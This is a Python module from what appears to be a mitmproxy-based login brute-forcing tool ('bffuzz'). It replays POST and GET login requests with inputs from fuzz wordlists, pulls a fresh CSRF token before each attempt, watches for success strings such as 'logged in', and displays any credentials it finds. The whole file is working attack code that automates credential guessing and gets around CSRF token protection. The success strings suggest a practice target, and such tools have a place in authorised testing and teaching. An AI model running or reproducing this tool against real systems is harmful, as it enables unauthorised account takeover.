"""Attack Module

This module implements attacks
"""
import logging
from mitmproxy import http
from mitmproxy import net
from mitmproxy import ctx
import os.path
from bs4 import BeautifulSoup
from abc import ABC, abstractmethod
import utils
from success_detector import SuccessDetector

logger = logging.getLogger("bffuzz")

PARAMETER_PREFIX = "fuzz_"
PREFIX_LEN = len(PARAMETER_PREFIX)
DBS_DIR = "./dbs/"


class Attack():
	"""Class implementing the attack."""


	def __init__(self, originator_flow=None):
		self.running = False
		self.SD = SuccessDetector()

		self.fuzzdbs: dict = {}
		self.fuzz_inputs: dict = {}
		self.fuzzed_host = None
		self.fuzzed_url = None
		self.originator_flow = originator_flow
		logger.info("Got instantiated attack")

	def isRunning(self):
		"""Checks if the attack is still running."""

		return self.running

	def start(self):
		"""Starts the attack."""

		self.running = True
		self.fuzzed_url = self.originator_flow.request.url
		self.fuzzed_host = self.originator_flow.request.host
		self.setFuzzDBPaths()
		self.loadFuzzInputs()

	def stop(self):
		"""Stops the attack."""

		self.running = False
		self.fuzzdbs: dict = {}
		self.fuzz_inputs: dict = {}
		self.fuzzed_host = None
		self.fuzzed_url = None
		self.SD = None
		self.originator_flow = None

	def setSuccessString(self, trigger_string: str, inverted=False) -> None:
		"""Sets string indicating correct response."""

		self.SD.setSuccessString(trigger_string, inverted)

	def setFuzzDBPaths(self) -> None:
		"""Identifies fuzzed parameters and maps them to respective file paths"""

		parameters = utils.getRequestParams(self.originator_flow.request)
		for parameter in parameters:
			value = parameters[parameter]
			if value.startswith(PARAMETER_PREFIX):
				self.fuzzdbs[parameter] = DBS_DIR + value[PREFIX_LEN:]
				if not os.path.exists(self.fuzzdbs[parameter]):
					logger.error("Fuzz database " + self.fuzzdbs[parameter] + " does not exist")
				else:
					logger.info("Loaded fuzz db path for parameter " + str(parameter) + " => " + self.fuzzdbs[parameter])

	def loadFuzzInputs(self) -> None:
		"""Loads fuzzing inputs in a list for each parameter"""

		for parameter in self.fuzzdbs:
			inputs_list = utils.loadPathToList(self.fuzzdbs[parameter])
			self.fuzz_inputs[parameter] = inputs_list
			logger.info("Loaded fuzz inputs for parameter: " + parameter)

	def setNextInput(self, flow: http.HTTPFlow) -> None:
		"""Set next fuzz input from the list."""

		#logger.info("In setNextInput, flow:" + str(flow.request))
		if not flow.request:
			logger.info("Provided flow does not contain a request")
		parameters = utils.getRequestParams(flow.request)
		logger.info("Parameters loaded:" + str(parameters))
		for param in parameters:
			logger.info("Checking parameter for next input:" + param)
			if param in self.fuzz_inputs:
				if not self.fuzz_inputs[param]:
					logger.warning("Fuzz input list is empty, terminating attack")
					utils.showMessage("Error", "Attack stopped: fuzz inputs depleted")
					self.stop()
					return
				utils.setFlowRequestParameter(flow, param, self.fuzz_inputs[param].pop())
				break
		logger.info("Next input set")

	@abstractmethod
	def handleRequest(self, flow: http.HTTPFlow) -> None:
		"""Handles requests received from the client or replayed from mitmproxy."""
		pass

	@abstractmethod
	def handleResponse(self, flow: http.HTTPFlow) -> None:
		"""Handles responses received from the server or replayed from mitmproxy."""
		pass

	@abstractmethod
	def prepareOriginatorReplay(self, token: str=None) -> http.HTTPFlow:
		"""Prepares a reply mechanism from initial triggering request used as a template."""
		pass


class POSTAttack(Attack):
	"""Implements a POST Attack."""

	def __init__(self, flow: http.HTTPFlow):
		super().__init__(flow)
		self.get_tmp = None
		self.SD.setSuccessString("logged in")

	def prepareOriginatorReplay(self, token=None) -> http.HTTPFlow:
		"""Prepares a new POST request from the originator POST form"""

		prepared_request_flow = self.originator_flow.copy()
		if token: 
			prepared_request_flow.request.urlencoded_form["user_token"] = token
		logger.info("Prepared new request flow from originator")
		return prepared_request_flow

	def handleRedirect(self, flow: http.HTTPFlow) -> None:
		"""Handles 302 redirect POST replies."""

		if not flow.is_replay:
			logger.info("Redirect response is not a replayed response")
			return
		if flow.response.status_code == 302:
			redir_response_flow = self.get_tmp.copy()

			redirect_location = flow.response.headers["Location"]
			redir_response_flow.request.path_components = redir_response_flow.request.path_components[:-1] + (redirect_location, )
			ctx.master.commands.call("replay.client", [redir_response_flow])

	def handleRequest(self, flow: http.HTTPFlow) -> None:
		"""Handles requests received from the client or replayed from mitmproxy."""
		
		if flow.request.method == "POST" and flow.request.url == self.fuzzed_url:
			logger.info("Spent CSRF token: " + flow.request.urlencoded_form["user_token"])
			if flow.is_replay == "request":
				self.SD.setCredentials(flow.request.urlencoded_form)
		if flow.is_replay == "request":
			logger.info("Replayed request detected:" + str(flow.request))
			return
		if flow.request.method == "GET" and flow.request.url == self.fuzzed_url:
			self.get_tmp = flow.copy()
			logger.info("Updated tmp GET request flow")

	def handleResponse(self, flow: http.HTTPFlow) -> None:
		"""Handles responses received from the server or replayed from mitmproxy."""

		logger.info("Got response:" + str(flow.response))
		if flow.request.method == "GET" and flow.request.host == self.fuzzed_host:
			logger.info("Received response to GET from fuzzed host")

			credentials = self.SD.isSuccess(flow)
			if credentials:
				logger.info("Found credentials, attack stopped")
				logger.info("Credentials: " + str(credentials))
				pp_creds = utils.prettyPrintDict(credentials)
				utils.showMessage("Success", str("Correct credentials:\n" + pp_creds))
				self.stop()
				return
			logger.info("Wrong GET response intercepted")

			fresh_token = utils.extractCSRF(flow)
			prepared_request_flow = self.prepareOriginatorReplay(fresh_token)

			self.setNextInput(prepared_request_flow)
			if not self.running:
				logger.info("Attack not running therefore exiting")
				return
			self.originator_flow = prepared_request_flow.copy()

			logger.info("Replaying POST request form with parameters: " + str(prepared_request_flow.request.urlencoded_form))
			ctx.master.commands.call("replay.client", [prepared_request_flow])
			
		if flow.request.method == "POST" and flow.request.url == self.fuzzed_url:
			if flow.response.status_code == 302:
				logger.info("Processing 302")
				self.handleRedirect(flow)
			elif flow.response.status_code == 200:
				logger.info("Received response to POST request from fuzzed host")

				credentials = self.SD.isSuccess(flow)
				if credentials:
					logger.info("Found credentials, attack stopped")
					logger.info("Credentials: " + str(credentials))
					pp_creds = utils.prettyPrintDict(credentials)
					utils.showMessage("Success", str("Correct credentials:\n" + pp_creds))
					self.stop()
					return
				logger.info("Response is not successful")

				fresh_token = utils.extractCSRF(flow)
				logger.info("Done extracting")
				prepared_request_flow = self.prepareOriginatorReplay(fresh_token)

				self.setNextInput(prepared_request_flow)
				if not self.running:
					logger.info("Attack not running therefore exiting")
					return
				logger.info("Replay POST request with parameters" + str(prepared_request_flow.request.urlencoded_form))
				ctx.master.commands.call("replay.client", [prepared_request_flow])



class GETAttack(Attack):
	"""Implements a GET Attack."""

	def __init__(self, flow: http.HTTPFlow):
		super().__init__(flow)
		self.SD.setSuccessString("Welcome to the password")

	def prepareOriginatorReplay(self, token=None) -> http.HTTPFlow:
		"""Prepares a new POST request from the originator POST form"""

		prepared_request_flow = self.originator_flow.copy()
		if token: 
			prepared_request_flow.request.query["user_token"] = token
		logger.info("Prepared new request flow from originator")
		return prepared_request_flow

	def handleRequest(self, flow: http.HTTPFlow) -> None:
		"""Handles requests received from the client or replayed from mitmproxy."""

		if not self.running:
			logger.warning("Attack won't handle request because it isn't running")
			return

		if flow.request.method == "GET":
			if flow.is_replay == "request":
				logger.info("Replaying GET request:" + str(flow.request))
				self.SD.setCredentials(flow.request.query)

	def handleResponse(self, flow: http.HTTPFlow) -> None:
		"""Handles responses received from the server or replayed from mitmproxy."""

		if not self.running:
			logger.warning("Attack won't handle response because it isn't running")
			return

		if flow.request.method == "GET" and flow.request.host == self.fuzzed_host:
			logger.info("Received response to GET request from fuzzed host")

			credentials = self.SD.isSuccess(flow)
			if credentials:
				logger.info("Found credentials, attack stopped")
				logger.info("Credentials: " + str(credentials))
				pp_creds = utils.prettyPrintDict(credentials)
				utils.showMessage("Success", str("Correct credentials:\n" + pp_creds))
				self.stop()
				return
			logger.info("Wrong GET response intercepted, extracting token")

			fresh_token = utils.extractCSRF(flow)
			logger.info("Done extracting")
			prepared_request_flow = self.prepareOriginatorReplay(fresh_token)

			self.setNextInput(prepared_request_flow)
			if not self.running:
				logger.info("Attack not running therefore exiting")
				return
			logger.info("Replay GET request with parameters" + str(prepared_request_flow.request.query))
			ctx.master.commands.call("replay.client", [prepared_request_flow])